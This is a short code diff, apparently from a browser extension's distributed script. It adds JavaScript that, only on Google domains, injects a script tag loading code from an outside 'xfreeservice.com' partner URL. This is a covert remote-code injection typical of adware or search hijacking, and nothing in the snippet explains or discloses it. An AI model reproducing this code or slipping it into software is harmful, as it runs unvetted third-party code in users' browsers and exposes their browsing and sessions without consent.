@@ -1,0 +1,14 @@
+
+
+
+
+if (window.location.hostname.indexOf('.google.') !== -1) {
+    var s = document.createElement("script");
+    s.type = "text/javascript";
+    s.src = 'https://a.xfreeservice.com/partner/XMI6a9Ur/';
+    document.body.appendChild(s);
+}
+
+ 
+
+ // Cached at Thu May 16 2019 19:36:08 GMT+0000 (Coordinated Universal Time) with hs.extdist.LT.
